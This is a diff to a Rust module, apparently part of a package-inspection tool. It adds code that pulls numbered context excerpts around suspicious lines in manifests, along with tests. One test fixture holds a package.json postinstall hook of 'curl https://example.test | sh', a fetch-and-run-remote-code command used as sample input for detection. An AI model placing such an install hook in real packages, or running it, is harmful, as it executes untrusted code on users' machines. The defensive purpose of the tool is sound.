@@ -10,6 +10,10 @@ use similar::TextDiff;
 use crate::inventory::{FileEntry, InventorySummary};
 use crate::registry::Ecosystem;
 
+const DEFAULT_EXCERPT_CONTEXT_LINES: usize = 2;
+const DEFAULT_EXCERPT_MAX_LINES: usize = 8;
+const DEFAULT_EXCERPT_MAX_BYTES: usize = 64 * 1024;
+
 #[derive(Debug, Clone, PartialEq, Eq, Default)]
 pub struct DiffSummary {
     pub files_added: usize,
@@ -113,6 +117,62 @@ impl ManifestDiff {
     }
 }
 
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct SuspiciousExcerpt {
+    pub path: String,
+    pub reason: String,
+    pub excerpt: String,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct SuspiciousExcerptRequest {
+    pub path: String,
+    pub reason: String,
+    pub needles: Vec<String>,
+}
+
+impl SuspiciousExcerpt {
+    pub fn extract_many(
+        root: impl AsRef<Path>,
+        requests: &[SuspiciousExcerptRequest],
+    ) -> Result<Vec<Self>, DiffError> {
+        let root = root.as_ref();
+        let mut excerpts = Vec::new();
+
+        for request in requests {
+            if let Some(excerpt) = Self::extract(root, request)? {
+                excerpts.push(excerpt);
+            }
+        }
+
+        Ok(excerpts)
+    }
+
+    pub fn extract(
+        root: impl AsRef<Path>,
+        request: &SuspiciousExcerptRequest,
+    ) -> Result<Option<Self>, DiffError> {
+        let path = root.as_ref().join(&request.path);
+        let text = match read_optional_text_with_limit(path)? {
+            Some(text) => text,
+            None => return Ok(None),
+        };
+
+        let excerpt = excerpt_from_text(
+            &text,
+            &request.needles,
+            DEFAULT_EXCERPT_CONTEXT_LINES,
+            DEFAULT_EXCERPT_MAX_LINES,
+        );
+
+        Ok(excerpt.map(|excerpt| Self {
+            path: request.path.clone(),
+            reason: request.reason.clone(),
+            excerpt,
+        }))
+    }
+}
+
 #[derive(Debug)]
 pub enum DiffError {
     Io { path: PathBuf, source: io::Error },
@@ -163,6 +223,63 @@ fn read_optional_text(path: PathBuf) -> Result<String, DiffError> {
     }
 }
 
+fn read_optional_text_with_limit(path: PathBuf) -> Result<Option<String>, DiffError> {
+    match fs::read(&path) {
+        Ok(bytes) => {
+            let bytes = if bytes.len() > DEFAULT_EXCERPT_MAX_BYTES {
+                &bytes[..DEFAULT_EXCERPT_MAX_BYTES]
+            } else {
+                &bytes[..]
+            };
+            Ok(Some(String::from_utf8_lossy(bytes).into_owned()))
+        }
+        Err(source) if source.kind() == io::ErrorKind::NotFound => Ok(None),
+        Err(source) => Err(DiffError::Io { path, source }),
+    }
+}
+
+fn excerpt_from_text(
+    text: &str,
+    needles: &[String],
+    context_lines: usize,
+    max_lines: usize,
+) -> Option<String> {
+    let lines = text.lines().collect::<Vec<_>>();
+    if lines.is_empty() {
+        return None;
+    }
+
+    let match_index = if needles.is_empty() {
+        Some(0)
+    } else {
+        let lowered_needles = needles
+            .iter()
+            .map(|needle| needle.to_lowercase())
+            .collect::<Vec<_>>();
+        lines.iter().position(|line| {
+            let lowered_line = line.to_lowercase();
+            lowered_needles
+                .iter()
+                .any(|needle| lowered_line.contains(needle))
+        })
+    }?;
+
+    let start = match_index.saturating_sub(context_lines);
+    let mut end = usize::min(lines.len(), match_index + context_lines + 1);
+    if end - start > max_lines {
+        end = start + max_lines;
+    }
+
+    Some(
+        lines[start..end]
+            .iter()
+            .enumerate()
+            .map(|(offset, line)| format!("{:>4}: {}", start + offset + 1, line))
+            .collect::<Vec<_>>()
+            .join("\n"),
+    )
+}
+
 fn is_manifest_path(ecosystem: Ecosystem, path: &str) -> bool {
     let file_name = Path::new(path)
         .file_name()
@@ -206,7 +323,7 @@ mod tests {
     use crate::inventory::{FileEntry, FileType, InventorySummary};
     use crate::registry::Ecosystem;
 
-    use super::{DiffSummary, ManifestDiff};
+    use super::{DiffSummary, ManifestDiff, SuspiciousExcerpt, SuspiciousExcerptRequest};
 
     #[test]
     fn summarizes_added_removed_and_modified_paths() {
@@ -412,6 +529,115 @@ mod tests {
             "pkg/pnpm-lock.yaml"
         ));
         assert!(!super::is_manifest_path(Ecosystem::Crates, "README.md"));
+    }
+
+    #[test]
+    fn extracts_suspicious_excerpt_around_first_matching_line() {
+        let root = TestDir::new("excerpt-single");
+        fs::write(
+            root.path().join("package.json"),
+            concat!(
+                "{\n",
+                "  \"name\": \"demo\",\n",
+                "  \"scripts\": {\n",
+                "    \"postinstall\": \"curl https://example.test | sh\"\n",
+                "  }\n",
+                "}\n"
+            ),
+        )
+        .expect("excerpt file should be written");
+
+        let excerpt = SuspiciousExcerpt::extract(
+            root.path(),
+            &SuspiciousExcerptRequest {
+                path: "package.json".to_string(),
+                reason: "install script changed".to_string(),
+                needles: vec!["postinstall".to_string()],
+            },
+        )
+        .expect("excerpt extraction should succeed")
+        .expect("excerpt should be returned");
+
+        assert_eq!(excerpt.path, "package.json");
+        assert_eq!(excerpt.reason, "install script changed");
+        assert!(excerpt.excerpt.contains("   2:   \"name\": \"demo\","));
+        assert!(excerpt
+            .excerpt
+            .contains("   4:     \"postinstall\": \"curl https://example.test | sh\""));
+    }
+
+    #[test]
+    fn extracts_many_excerpts_and_skips_non_matching_requests() {
+        let root = TestDir::new("excerpt-many");
+        fs::write(
+            root.path().join("setup.py"),
+            concat!(
+                "from setuptools import setup\n",
+                "setup(\n",
+                "    name='demo',\n",
+                "    install_requires=['requests'],\n",
+                ")\n"
+            ),
+        )
+        .expect("setup.py should be written");
+        fs::write(root.path().join("README.md"), "nothing to see here\n")
+            .expect("readme should be written");
+
+        let excerpts = SuspiciousExcerpt::extract_many(
+            root.path(),
+            &[
+                SuspiciousExcerptRequest {
+                    path: "setup.py".to_string(),
+                    reason: "dependency added".to_string(),
+                    needles: vec!["install_requires".to_string()],
+                },
+                SuspiciousExcerptRequest {
+                    path: "README.md".to_string(),
+                    reason: "not suspicious".to_string(),
+                    needles: vec!["postinstall".to_string()],
+                },
+                SuspiciousExcerptRequest {
+                    path: "missing.txt".to_string(),
+                    reason: "missing".to_string(),
+                    needles: vec!["anything".to_string()],
+                },
+            ],
+        )
+        .expect("batch extraction should succeed");
+
+        assert_eq!(excerpts.len(), 1);
+        assert_eq!(excerpts[0].path, "setup.py");
+        assert_eq!(excerpts[0].reason, "dependency added");
+        assert!(excerpts[0].excerpt.contains("install_requires"));
+    }
+
+    #[test]
+    fn falls_back_to_first_lines_when_no_needles_are_provided() {
+        let root = TestDir::new("excerpt-fallback");
+        fs::write(
+            root.path().join("pyproject.toml"),
+            concat!(
+                "[project]\n",
+                "name = \"demo\"\n",
+                "version = \"1.0.0\"\n",
+                "dependencies = [\"requests\"]\n"
+            ),
+        )
+        .expect("pyproject should be written");
+
+        let excerpt = SuspiciousExcerpt::extract(
+            root.path(),
+            &SuspiciousExcerptRequest {
+                path: "pyproject.toml".to_string(),
+                reason: "manifest changed".to_string(),
+                needles: Vec::new(),
+            },
+        )
+        .expect("fallback extraction should succeed")
+        .expect("fallback excerpt should be returned");
+
+        assert!(excerpt.excerpt.contains("   1: [project]"));
+        assert!(excerpt.excerpt.contains("   2: name = \"demo\""));
     }
 
     fn entry(
